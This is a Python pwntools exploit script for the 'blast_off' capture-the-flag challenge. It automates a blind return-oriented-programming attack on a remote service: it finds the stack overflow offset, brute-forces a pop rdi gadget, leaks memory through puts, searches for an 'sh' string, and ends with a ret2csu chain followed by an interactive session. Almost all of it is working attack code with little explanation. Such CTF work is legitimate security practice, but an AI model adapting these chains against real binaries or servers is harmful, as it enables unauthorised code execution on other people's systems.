from pwn import *

context.arch = "amd64"
context.terminal = "st"

def start():
    return remote("spaceheroes-blast-off.chals.io", 443, ssl=True, sni="spaceheroes-blast-off.chals.io")

def test():
    if args.GDB:
        gs = """
            b *main
            b *0x400b39
        """
        return gdb.debug("../src/blast_off", gdbscript=gs)
    else:
        return process("../src/blast_off")

def check_addr(addr):
    bad_addr = ["0a"]
    for b in bad_addr:
        if b in hex(addr):
            print(f"Found bad byte with {hex(addr)}")
            return False
    return True

def find_offset():
    for i in range(1, 100):
        log.info('\tTrying to crash program with %i bytes' % i)
        with context.quiet:
            p = start()
            p.recvuntil(b"start: ")
            p.sendline(cyclic(i))
            try:
                resp = p.recvall(timeout=0.5)
                if b"ready" not in resp:
                    return int(i/8) * 8

            except EOFError:
                return int(i/8)*8

def find_pop_rdi():
    for i in range(BROP_GADGET, BROP_GADGET + 0x30):
        log.info('\tFinding pop rdi at 0x%x' % i)
        with context.quiet:
            # Check if our pop rdi is right by 
            # doing printf(BLAST_OFF)
            p = start()
            chain = cyclic(offset)
            chain += p64(i+1)
            chain += p64(i)
            chain += p64(BLAST_OFF)
            chain += p64(PUTS_PLT)
            p.recvuntil(b"start: ")
            p.sendline(chain)
            try:
                resp = p.recvall(timeout=0.5)
                if len(resp) > 0 and len(resp) < 20 and resp != b"\n":
                    print(resp)
                    return i
            except EOFError:
                p.close()
                pass
            p.close()


def leak_blast_off():
    p = start()

    chain = cyclic(offset)
    chain += p64(ret)
    chain += p64(pop_rdi)
    chain += p64(BLAST_OFF)
    chain += p64(PUTS_PLT)
    chain += p64(MAIN)

    print(p.recvuntil(b"start: "))
    p.sendline(chain)
    p.recvline()
    addr = p.recv(6)
    print(addr)
    addr_array = list(bytearray(addr))
    blast_array = []
    for i in addr_array:
        blast_array.insert(0, hex(i).split("0x")[1])

    address = "0x" + "".join(blast_array)
    blast_off_leak = int(address, 16)
    print(f"Leaked blast off base address {hex(blast_off_leak)}\n")

    disassembly = []

    for i in range(blast_off_leak, blast_off_leak+300):

        if not check_addr(i):
            disassembly.append("0x00")
            continue


        chain = cyclic(offset)
        chain += p64(ret)
        chain += p64(pop_rdi)
        chain += p64(i)
        chain += p64(PUTS_PLT)
        chain += p64(MAIN)

        try:
            p.recvuntil(b"start: ")
            p.sendline(chain)
            p.recvline()
            try:

                disass = p.recvline()
                if disass != None and len(disass) > 1:
                    disass = disass.strip(b"\n")
                    print(f"Addr {hex(i)}, Data {disass}")
                    byt = hex(bytearray(disass)[0])

                    if byt == "0xc3":
                        print("Done")
                        #break
                else:
                    byt = "0x00"
                print(byt)
                disassembly.append(byt)

            except EOFError:
                pass
        except EOFError:
            pass
    print(len(disassembly))
    print(disassembly)


def discover_bin_sh():
    addr = BROP_GADGET
    context.log_level = "CRITICAL"
    while (addr < BROP_GADGET + 0x1000):
        p = start()
        try:
            chain = cyclic(offset)
            chain += p64(ret)
            chain += p64(pop_rdi)
            chain += p64(addr)
            chain += p64(PUTS_PLT)
            p.recvuntil(b"start: ")
            p.sendline(chain)
            data = p.recvall(timeout=0.1)
            if data:
                print("\tAddr: %s, Data: %s" % (hex(addr-1), data))
                if (b'sh' in data):
                    binsh = (addr-1)+data.index(b'sh')
                    return binsh
            addr += len(data)
        except:

            addr += 1
        p.close()

    context.log_level = "INFO"

def ret2csu():
    #p = test()
    p = start()

    chain = cyclic(offset)
    chain += p64(ret)
    chain += p64(csu_gadget_2)
    chain += p64(0) + p64(1) + p64(BLAST_OFF)
    chain += p64(3) + p64(2) + p64(1)
    chain += p64(csu_gadget_1) + p64(0) * 7

    p.sendline(chain)
    p.interactive()


# Getting Information from binary 
p = start()

p.recvuntil(b"PUTS_PLT")
PUTS_PLT = int(p.recvuntil(b"BROP_GADGET").split(b" | ")[0].strip(),16)
BROP_GADGET = int(p.recvuntil(b"BLAST_OFF").split(b"|")[0].strip(),16)
BLAST_OFF = int(p.recvuntil(b"MAIN").split(b"|")[0].strip().split(b" ")[1],16)
MAIN = int(p.recvline().split(b"|")[0].strip(),16)


offset = find_offset()
log.info(f"Found offset with {offset}")

brop_gadget = BROP_GADGET
# Either compile a binary with __libc_csu_init and check the
# actual offset
pop_rdi = brop_gadget + 9
csu_gadget_2 = brop_gadget
csu_gadget_1 = brop_gadget - 26
ret = pop_rdi + 1

# Or brute force it by checking if pop rdi puts_got puts_got
# will print out an address
pop_rdi = find_pop_rdi()

# Print all the strings out of the main binary
discover_bin_sh()
# Leak the external library function blast off and 
# print it by returning to main each time
leak_blast_off()

log.info(f"pop rdi, ret = {hex(pop_rdi)}")
log.info(f"ret = {hex(ret)}")
log.info(f"csu_gadget 1 = {hex(csu_gadget_1)}")
log.info(f"csu_gadget 2 = {hex(csu_gadget_2)}")
log.info(f"blast_off = {hex(BLAST_OFF)}")

print("Sending exploit")
# Then we do a ret2csu to call blast_off(3,2,1)
ret2csu()
